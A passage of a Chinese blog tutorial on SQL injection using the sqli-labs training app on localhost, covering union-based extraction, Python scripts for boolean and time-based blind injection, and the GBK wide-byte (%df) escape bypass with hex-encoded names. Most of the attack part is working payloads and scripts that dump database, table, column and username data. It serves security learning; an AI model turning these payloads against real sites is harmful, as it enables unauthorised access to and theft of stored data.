<p><a href="/uploads/2021/12/wp_editor_md_a57b941666c17d90d2975675462cc4c0.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_a57b941666c17d90d2975675462cc4c0.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h3 id="6获取数据库的表中的所有字段名">6.获取数据库的表中的所有字段名<a hidden class="anchor" aria-hidden="true" href="#6获取数据库的表中的所有字段名">#</a></h3>
<p><code>?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'),3 --+</code></p>
<p><a href="/uploads/2021/12/wp_editor_md_2d9803f05311afb485f669fbfc160887.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_2d9803f05311afb485f669fbfc160887.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h3 id="7获取字段中的数据">7.获取字段中的数据<a hidden class="anchor" aria-hidden="true" href="#7获取字段中的数据">#</a></h3>
<p><code>?id=0' union select 1,(select group_concat(username) from security.users),3 --+</code></p>
<p><a href="/uploads/2021/12/wp_editor_md_ff6a0607b389a27236c6e1c1de25b3a7.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_ff6a0607b389a27236c6e1c1de25b3a7.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="布尔盲注">布尔盲注<a hidden class="anchor" aria-hidden="true" href="#布尔盲注">#</a></h2>
<p>布尔盲注是有回显的，但是返回的只有两种信息，正确和错误，所以我们可以用sql语句来对数据库的内容根据回显情况来写脚本进行爆破。<br>
布尔注入常用函数：<br>
Length（）函数 返回字符串的长度<br>
Substr（）截取字符串<br>
Ascii（）返回字符的ascii码<br>
sleep(n)：将程序挂起一段时间 n为n秒<br>
if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
<p>这些函数咱在前面大多都已经讲过了。<br>
首先判断数据库名字长度：<br>
<a href="/uploads/2021/12/wp_editor_md_9920bd3f5f5f6d1f8ece9ba69e2c5646.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_9920bd3f5f5f6d1f8ece9ba69e2c5646.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}<br>
可以看到，当前数据库的长度为8，当我们令其等与8时就会返回1，也就是等式成立。<br>
这儿就可以写个脚本来进行爆破。<br>
下面我们以sqli-labs第8关为例。<br>
当我们输入id=1时，页面上有You are in&hellip;&hellip;&hellip;..的字符，当加上引号，这串字符消失，加上注释后，字符再次出现。说明这是字符型注入。<br>
下面我们判断其数据库的长度。<br>
这里可以不用写脚本，可以在浏览器构造好语句后用bp抓包，然后数值爆破就能得到数据库长度。<br>
<a href="/uploads/2021/12/wp_editor_md_3decb14b469211dae7cd9cfa43c86f8c.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_3decb14b469211dae7cd9cfa43c86f8c.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}<br>
这里爆破的是长度，所以用数字爆破，增量为一。<br>
<a href="/uploads/2021/12/wp_editor_md_ab0eabb79e4c3a6e26833c209dd7294c.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_ab0eabb79e4c3a6e26833c209dd7294c.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}<br>
这里可以看到数字8的长度不同，所以数据库的长度就是8。<br>
下边写脚本爆破（脚本写的丑，带佬们勿喷）</p>
<pre><code class="line-numbers">import requests
a=1
b=''
while a&lt;9:
    for i in range(44,124):
        r = requests.get("http://127.0.0.1/sql/Less-8/?id=1%27%20and%20(ascii(substr(database(),"+str(a)+",1)))="+str(i)+"--+")
        if 'You' in r.text:
            print(chr(i))
            b+=chr(i)
            a+=1
            break
print(b)

下边接着写脚本：
import requests
a = 0
#爆破表的数量
while 1:
    a+=1
    r = requests.get("http://127.0.0.1/sql/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema='security')="+str(a)+"--+")
    if 'You' in r.text:
        tables_sum = a
        print('表的数量：'+str(tables_sum))
        break
#爆破每个表的字长
for i in range(0,tables_sum+1):
    table_name = ''
    for j in range(0,20):
        r1 = requests.get("http://127.0.0.1/sql/Less-8/?id=1' AND (LENGTH((select table_name from information_schema.`TABLES` where table_schema = database() LIMIT "+str(i)+",1))) = "+str(j)+"--+")
        if 'You' in r1.text:
            table_len= j
            break
#爆破表名
    for k in range(0,table_len+1):
        for n in range(44,124):
            r2 = requests.get("http://127.0.0.1/sql/Less-8/?id=1' AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT "+str(i)+",1),"+str(k)+",1)) = "+str(n)+"--+")
            if 'You' in r2.text:
                table_name += chr(n)
                continue
    print('|  '+table_name)
    print('+------------------+')
</code></pre>
<p>写好之后就爆出表名，其中的语句跟union是差不多的，只是多了substr函数和limit函数。<br>
<a href="/uploads/2021/12/wp_editor_md_4995a02b1f9ccb36d684e67b0aca2a8d.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_4995a02b1f9ccb36d684e67b0aca2a8d.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}<br>
下一步是爆列名。</p>
<pre><code class="line-numbers">import requests
a = 0
#爆破列的数量
while 1:
    a+=1
    r = requests.get("http://127.0.0.1/sql/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_name='users')="+str(a)+"--+")
    if 'You' in r.text:
        columns_sum = a
        print('列的数量：'+str(columns_sum))
        break
#爆破每个表的表长
for i in range(0,columns_sum):
    column_name = ''
    for j in range(0,20):
        r1 = requests.get("http://127.0.0.1/sql/Less-8/?id=1' AND (LENGTH((select column_name from information_schema.columns where table_name = 'users' LIMIT "+str(i)+",1))) = "+str(j)+"--+")
        if 'You' in r1.text:
            column_len= j
            break
#爆破表名
    for k in range(0,column_len+1):
        for n in range(44,124):
            r2 = requests.get("http://127.0.0.1/sql/Less-8/?id=1' AND ASCII(SUBSTR((select column_name FROM information_schema.columns where table_name = 'users' LIMIT "+str(i)+",1),"+str(k)+",1)) = "+str(n)+"--+")
            if 'You' in r2.text:
                column_name += chr(n)
                continue
    print('|  '+column_name)
    print('+------------------+')
</code></pre>
<p>下面爆字段内容</p>
<pre><code class="line-numbers">import requests
a = 0
#爆字段的数量
while 1:
    a+=1
    r = requests.get("http://127.0.0.1/sql/Less-8/?id=1' and (select count(username) from security.users)="+str(a)+"--+")
    if 'You' in r.text:
        columns_sum = a
        print('列的数量：'+str(columns_sum))
        break
#爆破每个字段的长度
for i in range(0,columns_sum):
    column_name = ''
    for j in range(0,20):
        r1 = requests.get("http://127.0.0.1/sql/Less-8/?id=1' AND (select length(username) from security.users LIMIT "+str(i)+",1) = "+str(j)+"--+")
        if 'You' in r1.text:
            column_len= j
            break
#爆破字段内容
    for k in range(0,column_len+1):
        for n in range(44,124):
            r2 = requests.get("http://127.0.0.1/sql/Less-8/?id=1' AND ASCII(SUBSTR((select username from security.users  LIMIT "+str(i)+",1),"+str(k)+",1)) = "+str(n)+"--+")
            if 'You' in r2.text:
                column_name += chr(n)
                continue
    print('|  '+column_name)
    print('+------------------+')
</code></pre>
<p>其实这几个脚本都是一样的，只是换了一下里面的payload，当第一个脚本写好之后，后面的只需要改一下就行。</p>
<h2 id="下面接着来讲一下sql盲注sql盲注跟布尔盲注其实原理相同只是在浏览器返回上没有视觉上的显示需要我们构造sql语句当条件成立时通过数据库内的sleep函数造成延时从而判断出数据库内的内容最近在网上看到了一个延时注入的骚姿势通过get_lock函数来形成延时下次有时间我复现一下吧">下面接着来讲一下sql盲注，sql盲注跟布尔盲注其实原理相同，只是在浏览器返回上没有视觉上的显示，需要我们构造SQL语句，当条件成立时通过数据库内的sleep()函数，造成延时，从而判断出数据库内的内容。最近在网上看到了一个延时注入的骚姿势，通过get_lock（）函数来形成延时。下次有时间我复现一下吧。<a hidden class="anchor" aria-hidden="true" href="#下面接着来讲一下sql盲注sql盲注跟布尔盲注其实原理相同只是在浏览器返回上没有视觉上的显示需要我们构造sql语句当条件成立时通过数据库内的sleep函数造成延时从而判断出数据库内的内容最近在网上看到了一个延时注入的骚姿势通过get_lock函数来形成延时下次有时间我复现一下吧">#</a></h2>
<p>讲一下sql里边的if函数，if(c,a,b)，如果c为真执行a，否则执行b。这其实就是一个三元运算。<br>
这儿可以用之前的布尔盲注脚本改一下就可以了，他们的逻辑都是一样的，只是payload和判断方法是判断数据库的延时。</p>
<pre><code class="line-numbers">import requests
import time
a=1
b=''
while a&lt;9:
    start_time = time.time()
    for i in range(44,124):
        r = requests.get("http://127.0.0.1/sql/Less-8/?id=1' and if(((ascii(substr(database(),"+str(a)+",1)))="+str(i)+"),sleep(3),0)--+")
        if time.time() - start_time  &gt;= 3:
            print(chr(i))
            b+=chr(i)
            a+=1
            break
print(b)
</code></pre>
<p>这是我用上边的脚本进行修改的，就是改了一下payload和判断，就成功的爆出了数后面的也可以用之前的脚本来改。<br>
宽字节注入<br>
开发者为了防止sql注入，对用户输入中的单引号（’）进行处理，在单引号前加上斜杠（\）进行转义，这样被处理后的sql语句中，单引号不再具有原有的作用而是变成了普通的字符。</p>
<h2 id="宽字节注入原理">宽字节注入原理：<a hidden class="anchor" aria-hidden="true" href="#宽字节注入原理">#</a></h2>
<p>GBK 占用两字节<br>
ASCII占用一字节<br>
PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。<br>
大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。<br>
知道这个原理之后，后来的步骤就跟union注入一样了，唯一不一样的是，在查表和查库的时候，库名和表名在union注入里边需要用引号包起来，但是在这儿，引号被转义，我们就可以将其转成16进制来绕过。<br>
下边来实际操作一手<br>
以sqli-labs第32关为例<br>
我输入单引号的时候，在返回的内容里发现我的前面单引号给我加上了反斜杠，<br>
<a href="/uploads/2021/12/wp_editor_md_2136d54f6905de6216f7b55a70dc6621.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_2136d54f6905de6216f7b55a70dc6621.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}<br>
当我输入%df%27时页面报错，这是说明在这里%df与斜杠成功组合了逃逸出了单引号。<br>
<a href="/uploads/2021/12/wp_editor_md_5a7e92573ad87b4b8743281641f003b6.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_5a7e92573ad87b4b8743281641f003b6.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}<br>
当我再在后边加上注释符，发现页面又恢复正常了。说明在这儿存在宽字节注入。<br>
<a href="/uploads/2021/12/wp_editor_md_c79d1afddb638e37e63b94ba06c8597a.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_c79d1afddb638e37e63b94ba06c8597a.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}<br>
后边跟union就差不多了。<br>
查库<code>?id=0%df' union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p>
<p>查表，在这注意的是由于引号会被转义，所以在这可以用十六进制表示，也就是table_schematable_schema=0x7365637572697479<br>
?id=0%df&rsquo;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479&ndash;+</p>
<p>查表，这儿的table_name也是同样的道理。<br>
<code>?id=0%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code></p>
<p>爆字段<code>?id=0%df' union select 1,(select group_concat(username) from security.users),3 --+</code></p>
<p>先写到这儿吧，后边的后边再写<br>
参考<br>
<a href="https://blog.csdn.net/weixin">https://blog.csdn.net/weixin</a>_45146120/article/details/100104131?utm_source=app<br>
<a href="https://blog.csdn.net/santtde/article/details/91353689">https://blog.csdn.net/santtde/article/details/91353689</a><br>
<a href="https://www.w3school.com.cn/sql/sql_union.asp">https://www.w3school.com.cn/sql/sql_union.asp</a><br>
<a href="https://blog.csdn.net/weixin_43803070/article/details/89918772">https://blog.csdn.net/weixin_43803070/article/details/89918772</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
